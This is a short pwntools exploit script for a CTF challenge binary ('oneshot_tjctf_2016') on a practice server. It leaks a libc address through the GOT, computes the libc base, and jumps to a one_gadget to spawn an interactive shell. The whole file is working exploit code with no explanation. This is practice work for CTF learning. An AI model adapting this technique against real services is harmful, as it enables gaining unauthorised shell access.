from pwn import *

context(log_level='debug')

#io=process("./oneshot_tjctf_2016")
io=remote("node3.buuoj.cn",27185)

elf=ELF("./oneshot_tjctf_2016")

libc=ELF("./libc-2.23.so")
io.recv()

libc_got=elf.got['__libc_start_main']

print(hex(libc_got))

io.sendline(str(libc_got))

io.recvuntil(b'Value: ')

libc_start_main=int(io.recvuntil(b'\n',drop=True),16)
print(hex(libc_start_main))

libc_base=libc_start_main-libc.symbols['__libc_start_main']

onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]

one=onegadget[0]+libc_base

io.recv()

io.sendline(str(one))




#io=remote()

io.interactive()